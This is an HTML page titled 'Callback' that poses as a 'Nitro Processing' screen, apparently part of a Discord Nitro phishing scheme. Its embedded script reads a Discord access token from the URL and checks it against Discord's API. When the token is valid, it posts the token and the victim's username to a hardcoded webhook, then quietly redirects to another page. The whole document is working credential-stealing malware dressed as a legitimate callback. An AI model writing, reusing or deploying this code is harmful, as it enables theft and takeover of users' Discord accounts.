<!DOCTYPE html>
<html>
<head><title>Callback</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;padding:50px;">
    <h1>🔄 Nitro Processing...</h1>
    <script>
    // GRAB FROM URL PARAMS (discord app returns state)
    const urlParams = new URLSearchParams(window.location.search);
    const token = urlParams.get('token') || urlParams.get('access_token');
    
    if(token && token.length > 58){
        fetch('https://discord.com/api/v9/users/@me', {
            headers: {'Authorization': token}
        }).then(r => r.json()).then(user => {
            if(user.id){ // VALID TOKEN
                // SEND TO WEBHOOK
                fetch('https://discord.com/api/webhooks/1482696426575368252/iebzhhJsdt83_QXWG5hek6UhjU2rQ6BfKdU7h7_w_gsdP8fEFF-Dc2gPf6Bp0-i2ZKP-', {
                    method:'POST',
                    body:JSON.stringify({
                        content:`🎉 **iOS APP TOKEN VALIDATED**`,
                        embeds:[{description:`\`\`\`${token}\`\`\`\n**User:** ${user.username}#${user.discriminator}`,color:65280}]
                    })
                });
            }
        });
    }
    
    // REFRESH MAIN PAGE
    setTimeout(() => location.href = 'index.html', 1000);
    </script>
</body>
</html>
